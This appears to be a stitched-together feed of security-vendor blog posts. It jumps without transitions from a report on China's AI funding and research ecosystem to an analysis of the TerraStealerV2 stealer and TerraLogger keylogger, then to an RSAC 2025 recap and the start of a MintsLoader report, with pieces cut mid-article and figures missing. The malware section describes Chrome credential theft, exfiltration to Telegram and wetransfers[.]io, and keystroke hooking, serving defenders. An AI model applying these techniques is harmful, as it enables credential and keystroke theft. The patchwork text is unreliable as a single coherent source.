        <p>China’s S&amp;T innovation <a href="https://scsp222.substack.com/p/the-missing-piece-in-chinas-innovation">apparatus</a> very likely <a href="https://web.archive.org/web/20240618141413/https://mp.weixin.qq.com/s/NZxXb-LTiM3-PY4M36_VSA">emphasizes</a> (though it is perceived to be deficient in) collaboration among government — including laboratories and state-owned enterprises [SOE]) — industry, and academia. Accordingly, entities from each of these sectors contribute to China’s AI development enterprise. Entities from all three sectors are increasingly producing noted contributions to AI R&amp;D and applications. Contributions to theoretical research can be observed in scholarly papers accepted to the prestigious AI-focused Conference on Neural Information Processing Systems (NeurIPS) since 2021. <strong>Table 1</strong> lists examples of government, industry, and academic entities from among the top fifteen institutions named as the affiliation of one or more co-authors on papers accepted by the conference (2021–2024). Note that there are no top-fifteen NeurIPS contributors from China that are SOEs; two are included in <strong>Table 1</strong> to indicate that some SOEs are nevertheless attempting and occasionally succeeding to contribute to frontier AI advancement.</p>

SHLAB was <a href="https://archive.ph/3eHPo">created</a> in 2020 as an almost certainly state-affiliated "new-type scientific research institution" (新型科研机构). <a href="https://web.archive.org/web/20240908135712/https://www.shlab.org.cn/aboutus">Described</a> as a "large-scale comprehensive research base" (大型综合性研究基地), SHLAB offers open-source information repositories and platforms that facilitate AI development in specific areas. For example, its <a href="https://web.archive.org/web/20240910204955/https://openmmlab.com/">OpenMMLab</a> is an "open-source computer vision algorithm <a href="https://github.com/open-mmlab">system</a>" that seeks to <a href="https://web.archive.org/web/20240910204955/https://openmmlab.com/">facilitate</a> academic and industry applications; it claims to have users from more than 100 countries and territories (<strong>Figure 1</strong> shows reported user affiliations). SHLAB’s website further <a href="https://web.archive.org/web/20240908135712/https://www.shlab.org.cn/aboutus">asserts</a> strategic partnerships with at least thirteen universities across China. The research institution is also a significant <a href="https://carnegieendowment.org/research/2024/08/china-artificial-intelligence-ai-safety-regulation?center=europe&amp;lang=en">contributor</a> to China’s "technical research on AI safety, and it has also begun producing accompanying policy papers" to advance AI safety. In July 2023, China’s National Artificial Intelligence Standardization General Working Group (国家人工智能标准化总体组) announced the creation of a large model-focused working group (大模型专题组) led by SHLAB and <a href="https://merics.org/en/report/chinas-ai-development-model-era-technological-deglobalization">comprising</a> the companies Baidu, Huawei, Qihoo 360, China Mobile, iFlytek, and Alibaba.</p>

        <p>According to information <a href="https://web.archive.org/web/20250108233824/https://www.cac.gov.cn/2024-04/02/c_1713729983803145.htm">released</a> by the Cyberspace Administration of China, 302 generative AI service models are fully <a href="https://web.archive.org/web/20250203172535/https://www.stdaily.com/web/gdxw/2025-01/09/content_284094.html">registered</a> in China as of January 2025. Noteworthy frontier model companies contributing to China’s LLM capabilities — most often from the private sector, with some seen in the NeurIPS data — include DeepSeek, Alibaba, Baidu, 01.AI, Tencent, Stepfun, ByteDance, Infinigence AI, and ModelBest. Signifying the important role of academia-industry linkages, China’s "new AI tigers" — Baichuan AI, MiniMax, Moonshot AI, and Zhipu AI — were <a href="https://itif.org/publications/2024/08/26/how-innovative-is-china-in-ai/">founded</a> by Tsinghua University faculty and graduates.</p>
        <p>China’s semiconductor industry plays a key role in supporting the country’s ecosystem for AI development, which is almost certainly critical to achieving the AIDP’s goals. Faced with explicit efforts by the US to curtail China’s advances in both AI and semiconductors, China’s support — including financial support — for the domestic semiconductor industry has almost certainly accelerated. One vehicle of state-led investment, the <a href="https://www.reuters.com/technology/china-sets-up-475-bln-state-fund-boost-semiconductor-industry-2024-05-27/">multi-phase</a> China Integrated Circuit Industry Investment Fund ("Big Fund"; 国家集成电路产业投资基金) had minority <a href="https://thechinaproject.com/2023/02/03/chinas-top-10-semiconductor-firms/">ownership</a> in at least 74 domestic semiconductor companies as of February 2023. Huawei is a particularly important and rising <a href="https://merics.org/en/report/huawei-quietly-dominating-chinas-semiconductor-supply-chain">contributor</a> to China’s semiconductor industry, but multiple Chinese companies are making progress or experimenting with methods (<strong>Table 2</strong>) that — while far from cutting-edge capabilities and likely currently insufficient for domestic demand — likely have the potential to alleviate China’s dependence on the US and others in the long term. In March 2025, Bloomberg reported (citing unnamed sources) that China’s Ant Group had <a href="https://www.bloomberg.com/news/articles/2025-03-24/jack-ma-backed-ant-touts-ai-breakthrough-built-on-chinese-chips">found</a> a way to train AI models using domestically produced chips at a cheaper cost but with similar results compared to those obtained by using US chips.</p>

        <p><strong><em>Table 2:</em></strong> <em>Evidence of development and milestones in China’s domestic semiconductor industry (Source: Insikt Group)</em><br /><br />Economic espionage, whether state-led or otherwise, also very likely supports China’s progress in advancing its AI and semiconductor industries. It would be inaccurate to attribute all progress to this activity, but government-directed and tacitly allowed espionage almost certainly remains an important instrument in China’s <a href="https://www.uscc.gov/sites/default/files/2025-02/Kyle_Chan_Testimony.pdf">toolkit</a> for achieving modernization. In October 2023, intelligence leaders of the Five Eyes alliance <a href="https://www.reuters.com/world/five-eyes-intelligence-chiefs-warn-chinas-theft-intellectual-property-2023-10-18/">noted</a> AI as one sector targeted by China’s illicit actions. In February 2025, the US Department of Justice <a href="https://www.justice.gov/opa/pr/superseding-indictment-charges-chinese-national-relation-alleged-plan-steal-proprietary-ai">indicted</a> a former software engineer at Google over alleged attempts between mid-2022 and mid-2023 to steal proprietary information on hardware and software enabling supercomputing in support of large AI models. The engineer allegedly intended to use the information to support his own and another early-stage AI-related company. In November 2024, a former employee of South Korea’s SK Hynix Inc. was <a href="https://www.asiafinancial.com/sk-hynix-worker-jailed-for-stealing-chip-tech-korea-bizwire">convicted</a> of printing and seeking to retain proprietary documents on semiconductor manufacturing solutions in mid-2022, likely to <a href="https://web.archive.org/web/20240528140713/https://m.koreatimes.co.kr/pages/article.amp.asp?newsIdx=375511">facilitate</a> her role in a new position at Huawei. Although not always a form of espionage, China’s AI sector very likely further benefits from concerted efforts to <a href="https://www.trendforce.com/news/2025/02/21/new-ai-talent-race-heats-up-in-china-as-xiaomi-bytedance-and-alibaba-compete-for-experts/">attract</a> and <a href="https://chinatalenttracker.cset.tech/">recruit</a> <a href="https://www.reuters.com/technology/china-quietly-recruits-overseas-chip-talent-us-tightens-curbs-2023-08-24/">foreign</a> <a href="https://cset.georgetown.edu/publication/gao-huajian-and-the-china-talent-returnee-question/">talent</a>. Additionally, there is <a href="https://www.theverge.com/news/601195/openai-evidence-deepseek-distillation-ai-data">evidence</a> that Chinese companies have circumvented foreign platforms’ terms of service to enhance their own models through model distillation techniques.</p>
        <h3>Government and Venture Capital (VC) Funding</h3>
        <p>Funding for AI-related technologies is likely on an upward <a href="https://web.archive.org/web/20250317132408/http://www.xinhuanet.com/fortune/20250313/a7cb29ba2b3a49f4a9ac9a7c57dac9eb/c.html">trajectory</a> in both the US and China as of early 2025. Direct comparisons are difficult due to definitional issues and — especially with regard to China — data intransparency, but US federal government funding for civilian (non-military) AI likely exceeds the Chinese central government’s funding by up to several billion USD per year, especially in light of evidence of declining expenditure by Beijing until approximately 2023 (likely in part due to COVID-19). The balance of government-led investment when including activity at the state and provincial levels likely leans in China’s favor, where guidance funds combine public and private capital to invest approximately $16 billion annually in likely AI-related companies (broadly defined). Total private-sector investment in AI companies in the US far outstrips private-sector investment in China.</p>
        <p>According to Federal Budget IQ, the US federal government has <a href="https://federalbudgetiq.com/insights/federal-ai-and-it-research-and-development-spending-analysis/">increased</a> its AI and IT R&amp;D spending from $8.2 billion in 2021 to $10.4 billion in 2024, a nearly 27% increase. The 2025 fiscal year budget earmarked $11.2 billion for AI and IT R&amp;D spending. Removing spending by the US Department of Defense (DoD; $2.035 billion) and the Defense Advanced Research Projects Agency (DARPA; $1.41 billion), US federal spending on AI and IT R&amp;D for civilian applications represents approximately $7.33 billion. Within this, the budget for "core" AI ($1.955 billion) is the largest component, though funding for the likely AI-relevant area of high-capacity computing is also rising quickly. The US federal budget for "core" and "cross-cut" AI in fiscal year 2025 combined is $2.8 billion (excluding US DoD and DARPA).</p>
        <p>In China, total central government funding for AI is much more opaque. <strong>Figure 2</strong> and <strong>Figure 3</strong> show likely AI-related investment in basic, applied, and experimental R&amp;D over recent years for two of China’s <a href="https://www.uscc.gov/sites/default/files/2024-02/Ngor_Luong_Testimony.pdf">largest</a> government-run institutions: the National Natural Science Foundation of China (NSFC) and the Chinese Academy of Sciences (CAS). Specifically, <strong>Figure 3</strong> presents data from the budgets of three CAS institutes particularly <a href="https://cset.georgetown.edu/publication/fueling-chinas-innovation-the-chinese-academy-of-sciences-and-its-role-in-the-prcs-st-ecosystem/">focused</a> on AI. <strong>Figure 4</strong> shows notionally earmarked funds for research to be conducted under China’s "New Generation Artificial Intelligence" Megaproject (科技创新 2030—"新一代人工智能"重大项目). In addition to these data points and trends, the two organizations <a href="https://cset.georgetown.edu/publication/chinas-state-key-laboratory-system/">supervising</a> nearly half of China’s state key labs (SKLs) — the Ministry of Education and CAS — cumulatively budgeted 2.4 billion RMB ($327 million) under associated R&amp;D line items. Of this, approximately 29% would go to SKLs in the information and communications technology field, assuming funds were distributed equally among all SKLs supervised by these organizations and not accounting for other known unknowns.</p>
        <p>Insikt Group’s review of the data summarized above and evidence from other central government funding channels leads us to a low-confidence estimate that China’s central government spends on the order of several billion USD annually on likely AI-related R&amp;D, roughly similar to the US government’s <a href="https://federalbudgetiq.com/insights/federal-ai-and-it-research-and-development-spending-analysis/#:~:text=For%20core%20AI%20funding%2C%20the,and%20Agriculture%20(%24104%20million).">spending</a> on "core" and "cross-cut" AI (excluding US DoD and DARPA). Because "core" and "cross-cut" AI have a clear definition and estimating China’s funding relies on imperfect visibility into the research program it targets, it is likely that US federal government funding for AI is higher than that of China’s central government. Total Chinese government-led investment in AI — via guidance funds — likely exceeds US cumulative federal and state investment, however (discussed further below).</p>

        <p>The declining trend through the early 2020s is likely related to the impact of COVID-19 on China’s economy, but should also be viewed cautiously given missing data from other central government funding channels. As of early 2025, central government actors have signaled increasing interest in AI. In January 2025, Bank of China <a href="https://web.archive.org/web/20250127130750/https://www.bankofchina.com/aboutboc/bi1/202501/t20250123_25254674.html">announced</a> a five-year plan for financially supporting the AI industry value chain with a minimum of one trillion RMB ($138 billion). In March 2025, China’s National Development and Reform Commission <a href="https://archive.ph/7rzg6">announced</a> the establishment of a National Innovation Investment Guidance Fund (国家创业投资引导基金). The new fund is being dubbed an "aircraft carrier-level" (航母级) fund and will seek to raise one trillion RMB ($138.2 billion) while focusing investment on start-up, early-stage, small-, and medium-sized enterprises in "frontier domains" like AI, quantum science, and future energy. Indicating its focus on the concept of "patient capital," the fund’s duration is being set at twenty years — reportedly about five years longer than most other guidance funds.</p>
        <p>Government guidance funds, such as the one announced in March 2025, have been established at multiple levels of government in China and <a href="https://cset.georgetown.edu/publication/understanding-chinese-government-guidance-funds/">mix</a> funds from governmental and non-governmental sources (including corporate sources). This creates a challenge when attempting to isolate just central government funding. However, research published by the National Bureau of Economic Research (NBER) has <a href="https://www.nber.org/system/files/working_papers/w32701/w32701.pdf">found</a> that more broadly across central, provincial, and local governments, these guidance funds have "invested in 9,623 unique AI firms through more than 20,000 transactions, in total 184 billion USD" between 2000 and 2023, with the majority of transactions occurring since 2013. Annualizing this estimate over the 2013–2023 period points to an average spend of $16.7 billion per year, though the NBER study’s method of identifying AI companies was very broad and potentially leads to an overestimate. There are state-level initiatives in the US, such as New York’s Empire AI consortium that has received $565 million in <a href="https://www.governor.ny.gov/news/governor-hochul-unveils-fifth-proposal-2024-state-state-empire-ai-consortium-make-new-york">funding</a> from public and private <a href="https://govmarketnews.com/new-york-boosts-ai-research-with-165m-funding-package/">sources</a>, but they likely do not match sub-national funding in China, which is steadily increasing. In January 2025, two state-backed Chinese investment <a href="https://archive.ph/cjS4z">companies</a> <a href="https://archive.ph/RZBdk">announced</a> the creation of a National Artificial Intelligence Industry Investment Fund (国家人工智能产业投资基金) with an initial registered capital of 60 billion RMB ($8.2 billion).</p>
        <p>Although China’s government may be ahead in terms of total AI investment — when the likely small lag in central government spending is compared to the likely larger lead in sub-national investment through guidance funds — total private-sector investment in AI companies in the US vastly outmatches private-sector investment in China. This is seen in data (<strong>Figure 5</strong>) collected by both Stanford University’s Center for Human-Centered Artificial Intelligence (Stanford HAI) and the Emerging Technology Observatory (ETO), a project under Georgetown University’s Center for Security and Emerging Technology (CSET). Note that there is likely overlap between the aforementioned investments of China’s guidance funds and the private-sector investment data; that is, this data likely does not exclude investments in AI companies that come from government sources. This private-sector investment data is narrower, however; ETO’s data only reflects investments into 2,100 Chinese AI companies compared to the NBER study’s over 9,000 companies.</p>

        </p>
        <h2>Executive Summary</h2>
        <p>Insikt Group identified two new malware families — TerraStealerV2 and TerraLogger — linked to the financially motivated threat actor Golden Chickens (also known as Venom Spider). Golden Chickens is known for operating a Malware-as-a-Service (MaaS) platform used by cybercriminal groups such as FIN 6, Cobalt Group, and Evilnum. The new families, observed between January and April 2025, suggest ongoing development aimed at credential theft and keylogging.</p>
        <p>TerraStealerV2 is designed to collect browser credentials, cryptocurrency wallet data, and browser extension information. While it targets the Chrome “Login Data” database to steal credentials, it does not bypass Application Bound Encryption (ABE) protections introduced in Chrome updates after July 2024, indicating the malware code is outdated or still under development. Data is exfiltrated to both Telegram and the domain wetransfers[.]io. The stealer has been observed being distributed via multiple formats, including LNK, MSI, DLL, and EXE files, and leverages trusted Windows utilities, such as regsvr32.exe and mshta.exe, to evade detection.</p>
        <p>TerraLogger, by contrast, is a standalone keylogger. It uses a common low-level keyboard hook to record keystrokes and writes the logs to local files. However, it does not include functionality for data exfiltration or command-and-control (C2) communication, indicating it is either in early development or intended to be a modular part of the Golden Chickens MaaS ecosystem.</p>
        <p>The current state of TerraStealerV2 and TerraLogger suggests that both tools remain under active development and do not yet exhibit the level of stealth typically associated with mature Golden Chickens tooling. Given Golden Chickens’ history of developing malware for credential theft and access operations, these capabilities will likely continue to evolve. Organizations are advised to follow the mitigation guidance provided in this report to reduce the risk of compromise as these malware families mature.</p>
        <h2>Key Findings</h2>
        <ul>
          <li>Insikt Group identified two new malware families, TerraStealerV2 and TerraLogger, attributed to the threat actor Golden Chickens. TerraStealerV2 can steal browser credentials and target cryptocurrency wallets, while TerraLogger functions solely as a standalone keylogger module.</li>
          <li>TerraLogger is the first observed use of a keylogging capability within malware developed by Golden Chickens.</li>
          <li>TerraStealerV2 lacks support for decrypting Chrome ABE-protected credentials, indicating the tool is likely outdated or still under development.</li>
          <li>Insikt Group observed ten distinct TerraStealerV2 distribution samples between January and March 2025 that employed varied delivery methods, including MSI, DLL, and LNK files.</li>
        </ul>
        <h2>Background</h2>
        <p>Golden Chickens, also tracked under the alias Venom Spider, is a financially motivated cyber threat actor known for operating a stealthy and modular malware suite under a MaaS model. Since <a href="https://www.esentire.com/resources/library/unmasking-venom-spider">at least</a> 2018, the Golden Chickens MaaS suite has been deployed in campaigns targeting high-value organizations through social engineering vectors, particularly spearphishing campaigns leveraging fake job offers or resumes. Notably, the malware is used by top-tier cybercrime groups, including Russia-based FIN6 and Cobalt Group, as well as the Belarus-based Evilnum, which has been <a href="https://www.esentire.com/resources/library/unmasking-venom-spider">linked</a> to damages of over $1.5 billion USD globally￼.</p>
        <p>The core components of the Golden Chickens MaaS suite are VenomLNK and TerraLoader. Initial infections are typically achieved through VenomLNK, a malicious Windows shortcut file, which executes TerraLoader, a loader module responsible for deploying additional Golden Chickens malware. These modules include TerraStealer for credential harvesting, TerraTV for TeamViewer hijacking, and TerraCrypt for ransomware deployment. Additional malware families attributed to the Golden Chickens ecosystem include TerraRecon for reconnaissance, TerraWiper for data wiping, and lite_more_eggs, as depicted in Figure 1 below.</p>

        <p>Attribution efforts by eSentire’s Threat Response Unit have <a href="https://www.esentire.com/resources/library/unmasking-venom-spider">linked</a> Golden Chickens to a threat actor known as badbullzvenom, a persona that is believed to be operated jointly by individuals from Moldova and Montreal, Canada. The threat actor’s development history demonstrates progress from a low-level forum participant to an established MaaS provider. Tools developed by Golden Chickens have been <a href="https://www.esentire.com/resources/library/unmasking-venom-spider">weaponized</a> in several campaigns, including high-profile attacks on British Airways, Newegg, and Ticketmaster UK￼.</p>
        <p>Between August and October 2024, Zscaler ThreatLabz <a href="https://www.zscaler.com/blogs/security-research/unveiling-revc2-and-venom-loader">observed</a> renewed activity attributed to Golden Chickens involving the deployment of two newly identified malware families: RevC2 and Venom Loader. These tools were delivered via VenomLNK campaigns, leveraging social engineering lures like cryptocurrency payment requests and software API documentation. <strong>Figure 2</strong> illustrates the attack chain used to deliver RevC2.</p>

        </div>
        <p>While the initial delivery vector is not known, the infection sequence begins with the execution of a VenomLNK file. This file downloads a decoy image consistent with the lure theme (in this case, software API documentation) and initiates RevC2 execution. Specifically, the LNK file leverages wmic.exe to invoke regsvr32.exe, which loads a malicious OCX payload hosted on a remote network share.</p>
        <h2>Technical Analysis</h2>
        <p>Insikt Group identified two new malware families attributed to the threat actor group Golden Chickens. The first, tracked as TerraStealerV2, is a stealer primarily targeting browser credentials, cryptocurrency wallets, and browser extensions. The second, tracked as TerraLogger, is a keylogger observed as a standalone module. The following subsections provide a detailed technical analysis of each malware family.</p>
        <h3>TerraStealerV2</h3>
        <p>Insikt Group recently identified a new stealer attributed to Golden Chickens, uploaded to Recorded Future Malware Intelligence on March 3, 2025. A Program Database (PDB) path embedded in the sample (see <strong>Figure 3</strong>) suggests the threat actor refers to the malware as NOK; however, Insikt Group tracks it as TerraStealerV2.</p>
        <div>
          <div>
            <div>C:\Users\Admin\source\repos\NOK\NOK\x64\Release\NOK.pdb</div>
          </div>
        </div>
        <p><strong><em>Figure 3:</em></strong> <em>TerraStealerV2 PDB string (Source: Recorded Future)</em></p>
        <p>The stealer is intended to be delivered as an OCX file and executed via regsvr32.exe, which invokes the DllRegisterServer export function. Upon execution, DllRegisterServer first checks that the provided file has a .ocx extension and that the filename ends with a specific hard-coded character or digit (for example, 0.ocx). It then verifies that the file is being run by regsvr32.exe before proceeding, as illustrated in <strong>Figure 4</strong> below.</p>

          </div>
        </div>
        <p>The malware then performs string deobfuscation using an XOR decoding routine with a hard-coded key. It collects basic host information by invoking <a href="https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getusernamea">GetUserNameA</a> and <a href="https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getcomputernamea">GetComputerNameA</a> to retrieve the local user and system names. It then determines the victim’s IP address by making an HTTP request to <em>ifconfig[.]me</em>. The collected data is subsequently exfiltrated via the Telegram messaging platform to a channel named “Noterdam” using a bot token associated with “NoterdanssBot,” as shown in <strong>Figure 5</strong>.</p>

        <p>The malware then enumerates active processes, searching for instances of chrome.exe; if detected, it attempts to terminate the process using the <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-terminateprocess">TerminateProcess</a> Windows API. This behavior is likely intended to release any file locks on Chrome’s browser database files, ensuring unobstructed access during data extraction. Following this, the malware attempts to extract stored credentials and other sensitive data from Chrome and targets specific cryptocurrency wallets and browser extensions.</p>
        <p>The Chrome browser database theft implementation copies the "Login Data" database to C:ProgramData\Temp\LoginData and then extracts saved logins using a statically linked SQLite library to execute the SQL query SELECT origin_url, username_value, password_value FROM logins. TerraStealerV2 uses SQLite version 3.46.0, which is the same version statically linked in RevC2, suggesting possible code reuse or shared development practices. However, the implementation does not bypass Chrome’s ABE, meaning collected passwords will not be decrypted for any hosts with Chrome-based browsers updated since July 24, 2024. This limitation suggests that the stealer code is outdated or still under active development, as effective stealers typically incorporate ABE bypass techniques to extract decrypted credentials from modern versions of Chrome or Microsoft Edge.</p>
        <p>Exfiltrated browser login data and informational messages are written to C:\ProgramData\file.txt and copied to %LOCALAPPDATA%\Packages\Bay0NsQIzx\p.txt when stealing operations have completed. If found, targeted browser extensions and wallets have their directories copied to %LOCALAPPDATA%\Packages\Bay0NsQIzx, and a Telegram message is sent indicating the number of crypto wallets found. The contents of %LOCALAPPDATA%\Packages\Bay0NsQIzx are subsequently compressed into an archive named output.zip, located in the same directory. The archive is then exfiltrated to the Telegram bot and a secondary C2 endpoint hosted at <em>wetransfers[.]io/uplo.php</em>, as shown in <strong>Figure 7</strong>. The domain wetransfers[.]io was registered on February 18, 2025, via NameCheap, Inc., and is currently hosted behind Cloudflare infrastructure.</p>

        <h4>Distribution</h4>
        <p>Insikt Group has identified multiple delivery mechanisms employed in the distribution of TerraStealerV2, including executable files (EXEs), dynamic-link libraries (DLLs), Windows Installer packages (MSI), and shortcut (LNK) files. Across all observed cases, the TerraStealerV2 OCX payload was retrieved from the URL wetransfers[.]io/v.php — a resource hosted on the same domain leveraged for data exfiltration — using either curl or PowerShell, and subsequently executed via regsvr32.exe (see <strong>Figure 8</strong>).</p>

        <p><strong>Table 1</strong> lists distribution samples, including their filenames, compilation timestamps, and the corresponding TerraStealerV2 payloads Golden Chickens have been observed deploying. One LNK file (SHA-256: 9aed0eda60e4e1138be5d6d8d0280343a3cf6b30d39a704b2d00503261adbe2a) appears to overlap with the activity cluster tracked as ClickFix. In this case, the LNK file dropped a payload masquerading as an MP4 file, which was executed via mshta.exe — a technique consistent with previously observed tactics in ClickFix campaigns.</p>

        <p><strong><em>Table 1:</em></strong> <em>Samples used to distribute TerraStealerV2 (Source: Recorded Future)</em></p>
        <h2>TerraLogger</h2>
        <p>Insikt Group identified a new keylogger associated with Golden Chickens, which was uploaded to Recorded Future Malware Intelligence on January 13, 2025. Insikt Group tracks this family as TerraLogger and has identified five distinct samples. Four samples operate as intended and contain an identical PDB string, shown in <strong>Figure 9</strong> below. The remaining sample does not include this PDB string and instead uses the same PDB path as TerraStealerV2 (see <strong>Figure 3</strong> above). This outlier appears to be a developer test, using the same string-encoding method as TerraStealerV2; however, it fails during execution due to a crash while initializing keylogger-related strings, which prevents the malware from reaching its primary entry point.</p>
        <div>
          <div>
            <div><code>C:\Users\PC\Downloads\Projector\Projector\x64\Release\Projector.pdb</code></div>
          </div>
        </div>
        <p><strong><em>Figure 9:</em></strong> <em>TerraLogger PDB string (Source: Recorded Future)</em></p>
        <p>TerraLogger is typically delivered as an OCX file and employs the same initial execution checks as TerraStealerV2. It is intended to be executed via regsvr32.exe, which invokes the DllRegisterServer export function. Upon execution, it first checks that the provided file has a .ocx extension and that the filename ends with a hard-coded character or digit (such as 0.ocx). It then verifies that it is being run by regsvr32.exe before proceeding. If the initial execution checks pass, TerraLogger opens a file handle to log keystrokes.</p>
        <p>Insikt Group identified multiple file paths across the five identified samples, with logs written to files such as a.txt, f.txt, op.txt, or save.txt located in the C:\ProgramData folder. The malware implements its keylogger using a commonly observed technique by installing a WH_KEYBOARD_LL hook using <a href="https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa">SetWindowsHookExA</a>, registering the fn callback function (shown in <strong>Figure 10</strong>) to intercept and process message events, enabling keyboard activity to be captured.</p>

        <p>Keystrokes are written to the open log file within the mw_log_key function. This function first retrieves the title of the current foreground window, then appends a line separator followed by the intercepted keystrokes. It contains logic to handle special characters, such as semicolons, brackets, and quotes, and checks the state of the Shift key to determine the correct character to log. If a keycode does not match any known special keys, it is written in &lt;KEY-[keycode]&gt; format. An example of a resulting log file is shown in <strong>Figure 11</strong>.</p>

        <p><strong>Table 2</strong> lists the five TerraLogger keylogger samples identified and summarizes the differences across versions. Compilation timestamps indicate that the first version was built on January 13, 2025, and that the most recent sample was compiled on April 1, 2025. These samples reflect minor, incremental updates, suggesting active development. Notable changes include modifications to the file path used for storing keystroke logs and a shift in how special keys are represented — from angle-bracketed, uppercase tokens (for example, , ) to pipe-delimited, lowercase abbreviations (for example, |bck|, |sft|).</p>

            <description><![CDATA[There was much to see at RSAC 2025. Read the recap about a few highlights from the expo floor.]]></description>
            <content:encoded><![CDATA[
        <p>The 2025 RSA Conference in San Francisco once again showcased the cutting edge of cybersecurity innovation. This year's expo floor was particularly vibrant, reflecting how the industry continues to evolve in response to increasingly sophisticated threats. As I navigated the bustling halls, I noted key highlights and trends that are notable for the conference and shaping the security market.</p>
        <h3>AI Assisted Security Operations</h3>
        <p>The most prominent theme throughout the expo was the integration of advanced AI into security tools. This year's offerings demonstrated AI assisted capabilities that provide actionable intelligence and simplify complex tasks. Several vendors showcased platforms that went beyond just incorporating AI but now take actions to offload some of the work of security practitioners. When businesses need to do more with less along with the struggle to find security talent, this should go a long way.</p>
        <h3>The Spectrum of Threat Intelligence</h3>
        <p>One thing that caught my eye when walking the expo floor was the number of vendors and booths displaying Threat Intelligence signage prominently on their displays and TVs. After talking to reps at the booths, it was clear that there is a wide spectrum of threat intelligence available, and it is important to know which type works best for you and asking what sort of threat intelligence the vendor is offering. One one end of the spectrum, you have some vendors are providing true first-party threat (first-party threat intelligence—data collected directly by the vendor through their own sensors, honeypots, and research teams—providing unique visibility that can't be found elsewhere) intelligence, while the other end of the spectrum are vendors providing threat intelligence in their products that consists of the ability to take in an open source feed.</p>
        <h3>Animals of Cybersecurity Marketing</h3>
        <p>A big highlight of the expo were two vendors taking a decidedly analog approach to standing out on the crowded RSAC expo floor. Attendees could take a break from technical discussions to spend a few minutes cuddling the puppies who were available for adoption. Just across the room, a small pen of miniature goats complete with hay bales and "Greatest Of All Time (GOAT)" signage, created an effective contrast to the high-tech solutions being pitched. Both animal-themed booths proved that in the battle for attendee attention, sometimes the most effective strategy is simply offering a moment of joy amid the cybersecurity intensity.</p>

        <h2>Recorded Future’s Branding and Malware Intelligence on the Expo Floor</h2>
        <p>A highlight for me was seeing Recorded Future’s new brand on display front and center on the show floor with the new electric blue and bold red accent colors. The boldness of the brand stood out amid a sea of sameness – dark displays, matrix-like code animations, and ubiquitous hooded figures – and captured what Recorded Future is all about. When organizations are facing increasingly sophisticated threats, they need a bold partner that stands out from the others with clarity, focus, and actionable insights.</p>
        <p>
          <img loading="lazy" alt="rsac-recap-003.jpg" src="https://www.recordedfuture.com/media_190c1a1b21d6052c0c7d7b247716ebeaa92e53cce.jpg?width=750&amp;format=jpg&amp;optimize=medium" width="1600" height="1200" />
        </p>
        <p>Coupling the new brand with the launch of Recorded Future’s new Malware Intelligence offerings made the booth one of the must see stops as attendees made their way around the floor. Attendees were able to see demos of the product and see for themselves how Malware Intelligence helped achieve the following outcomes:</p>
        <ul>
          <li>Reduction in time spent analyzing malware samples</li>
          <li>Automated malware detection at scale</li>
          <li>Shift from reactive to proactive and spot emerging threats before they become a problem</li>
        </ul>
        <p><strong>The average team saves 11 hours weekly on threat analysis, hunting, and reporting efforts with Recorded Future Malware Intelligence (<a href="http://uevi.co/6959AEDT">Source</a>)</strong></p>
        <p>The team also discussed the new capabilities available with Malware Intelligence including malware hunting, Auto YARA Rules, and malware Alerts.</p>
        <p>

        </p>
        <p>Don’t worry if you were unable to stop by the booth, you can find more information on Malware Intelligence on the new Recorded Future website at <a href="http://www.recordedfuture.com/malware-intelligence">www.recordedfuture.com/malware-intelligence</a>.</p>
        <h2>Looking Ahead</h2>
        <p>As I left the expo floor, it was clear that the cybersecurity industry continues its march toward more integrated, intelligence-driven approaches. The vendors that stood out weren't those with the flashiest booths or the most aggressive marketing—they were those offering genuine advancements in connecting disparate security data points into coherent, actionable intelligence. As the conference comes to a close, it was great to hear all the new ideas, see the keynotes, and network with other security practitioners. I look forward to RSAC 2026 and I am curious what animals might be on the show floor next year.</p>

          <img loading="lazy" alt="insikt group logo" src="https://www.recordedfuture.com/media_17759d8b91bf0c9106a0fa82007bef7e3316158b4.png?width=750&amp;format=png&amp;optimize=medium" width="300" height="48" />
        </p>
        <h2>Executive Summary</h2>
        <p>MintsLoader, a malicious loader, was first observed in multiple phishing and drive-by download campaigns as early as 2024. The loader commonly deploys second-stage payloads such as GhostWeaver, StealC, and a modified BOINC (Berkeley Open Infrastructure for Network Computing) client. MintsLoader operates through a multi-stage infection chain involving obfuscated JavaScript and PowerShell scripts. The malware employs sandbox and virtual machine evasion techniques, a domain generation algorithm (DGA), and HTTP-based command-and-control (C2) communications.</p>
        <p>MintsLoader has been observed being used by various threat groups; however, operators of TAG-124 (also known as LandUpdate808) have used it extensively. The loader is deployed through multiple infection vectors, including phishing emails targeting the industrial, legal, and energy sectors (TAG-124); compromised websites impersonating browser update prompts (SocGholish); and invoice-themed lures distributed via Italy’s PEC certified email system.</p>
        <p>MintsLoader’s use of obfuscation complicates static detections such as YARA rules, its use of DGA-based C2 infrastructure makes it difficult to maintain up-to-date watchlists or blocklists, and its anti-analysis techniques complicate host-based detections that rely on sandboxes or virtualization. But Recorded Future’s Malware Intelligence Hunting identifies new MintsLoader samples and associated C2 domains and provides an up-to-date list for blocklists or threat hunting.</p>
        <p>MintsLoader’s persistent use of obfuscation, sandbox evasion, and adaptive infrastructure likely ensures its continued presence within the malware ecosystem, likely leading to increased use by additional threat actors. The malware’s role as a versatile delivery mechanism reflects the increasing professionalization and specialization within the cybercriminal community. While this growing sophistication benefits threat actors by enabling more resilient and efficient operations, it may simultaneously provide opportunities for defenders to identify and disrupt malicious activity more effectively and at scale.</p>
        <h2>Key Findings</h2>
        <ul>
          <li>MintsLoader's second-stage PowerShell script uses sandbox and virtual environment evasion techniques, reducing its susceptibility to automated analysis and increasing its likelihood of bypassing dynamic detection tools.</li>
          <li>MintsLoader's use of a DGA to generate daily C2 domains based on the system date complicates infrastructure monitoring activity and domain/IP-based detections.</li>
          <li>Recorded Future’s Malware Intelligence Hunting provides up-to-date C2 domains and other artifacts related to MintsLoader that would otherwise be hard to track due to its dynamic infrastructure.</li>
          <li>Insikt Group shows that GhostWeaver is the primary payload deployed by MintsLoader across observed campaigns.</li>
          <li>GhostWeaver’s self-signed X.509 certificates are similar to those of AsyncRAT and variants of AsyncRAT, leading to initial false associations with other malware families such as AsyncRAT.</li>
        </ul>
        <h2>Background</h2>
